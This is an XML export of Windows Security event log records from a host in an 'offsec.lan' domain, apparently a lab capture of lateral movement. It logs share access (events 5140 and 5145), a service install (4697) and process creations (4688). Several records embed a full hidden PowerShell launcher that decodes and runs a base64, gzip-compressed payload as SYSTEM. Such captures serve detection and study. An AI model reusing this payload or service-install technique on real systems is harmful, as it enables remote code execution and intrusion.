<root>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>5140</EventID>
      <Version>1</Version>
      <Level>0</Level>
      <Task>12808</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:56:41.780040200Z" />
      <EventRecordID>354571</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="5328" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
      <Data Name="SubjectUserName">admmig</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1659379</Data>
      <Data Name="ObjectType">File</Data>
      <Data Name="IpAddress">10.23.123.11</Data>
      <Data Name="IpPort">43133</Data>
      <Data Name="ShareName">\\*\IPC$</Data>
      <Data Name="ShareLocalPath">
      </Data>
      <Data Name="AccessMask">0x1</Data>
      <Data Name="AccessList">%%4416
				</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>5140</EventID>
      <Version>1</Version>
      <Level>0</Level>
      <Task>12808</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:56:41.786672700Z" />
      <EventRecordID>354572</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="5328" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
      <Data Name="SubjectUserName">admmig</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1659379</Data>
      <Data Name="ObjectType">File</Data>
      <Data Name="IpAddress">10.23.123.11</Data>
      <Data Name="IpPort">43133</Data>
      <Data Name="ShareName">\\*\ADMIN$</Data>
      <Data Name="ShareLocalPath">\??\C:\Windows</Data>
      <Data Name="AccessMask">0x1</Data>
      <Data Name="AccessList">%%4416
				</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>5145</EventID>
      <Version>0</Version>
      <Level>0</Level>
      <Task>12811</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:56:41.818163600Z" />
      <EventRecordID>354573</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="5328" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
      <Data Name="SubjectUserName">admmig</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1659379</Data>
      <Data Name="ObjectType">File</Data>
      <Data Name="IpAddress">10.23.123.11</Data>
      <Data Name="IpPort">43133</Data>
      <Data Name="ShareName">\\*\ADMIN$</Data>
      <Data Name="ShareLocalPath">\??\C:\Windows</Data>
      <Data Name="RelativeTargetName">System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="AccessMask">0x1</Data>
      <Data Name="AccessList">%%4416
				</Data>
      <Data Name="AccessReason">-</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>5140</EventID>
      <Version>1</Version>
      <Level>0</Level>
      <Task>12808</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:56:41.897424000Z" />
      <EventRecordID>354574</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="2424" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
      <Data Name="SubjectUserName">admmig</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1659379</Data>
      <Data Name="ObjectType">File</Data>
      <Data Name="IpAddress">10.23.123.11</Data>
      <Data Name="IpPort">43133</Data>
      <Data Name="ShareName">\\*\IPC$</Data>
      <Data Name="ShareLocalPath">
      </Data>
      <Data Name="AccessMask">0x1</Data>
      <Data Name="AccessList">%%4416
				</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>5145</EventID>
      <Version>0</Version>
      <Level>0</Level>
      <Task>12811</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:56:41.905911100Z" />
      <EventRecordID>354575</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="2424" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
      <Data Name="SubjectUserName">admmig</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1659379</Data>
      <Data Name="ObjectType">File</Data>
      <Data Name="IpAddress">10.23.123.11</Data>
      <Data Name="IpPort">43133</Data>
      <Data Name="ShareName">\\*\IPC$</Data>
      <Data Name="ShareLocalPath">
      </Data>
      <Data Name="RelativeTargetName">svcctl</Data>
      <Data Name="AccessMask">0x7</Data>
      <Data Name="AccessList">%%4416
				%%4417
				%%4418
				</Data>
      <Data Name="AccessReason">-</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4697</EventID>
      <Version>0</Version>
      <Level>0</Level>
      <Task>12289</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:56:43.234146800Z" />
      <EventRecordID>354577</EventRecordID>
      <Correlation ActivityID="{42422748-35ed-0000-6027-4242ed35d701}" />
      <Execution ProcessID="584" ThreadID="5408" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
      <Data Name="SubjectUserName">admmig</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1659379</Data>
      <Data Name="ServiceName">iOWamcEn</Data>
      <Data Name="ServiceFileName">%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"</Data>
      <Data Name="ServiceType">0x10</Data>
      <Data Name="ServiceStartType">3</Data>
      <Data Name="ServiceAccount">LocalSystem</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:56:43.246337200Z" />
      <EventRecordID>354578</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="2424" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x1510</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x238</Data>
      <Data Name="CommandLine">C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\services.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:56:43.280332800Z" />
      <EventRecordID>354579</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="2424" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x1140</Data>
      <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1510</Data>
      <Data Name="CommandLine">powershell.exe  -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:56:43.345871200Z" />
      <EventRecordID>354580</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="2424" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0xb34</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1140</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:56:46.597935000Z" />
      <EventRecordID>354598</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="5328" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x13b8</Data>
      <Data Name="NewProcessName">C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1140</Data>
      <Data Name="CommandLine">"C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe" -noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:56:47.113365900Z" />
      <EventRecordID>354599</EventRecordID>
      <Correlation />
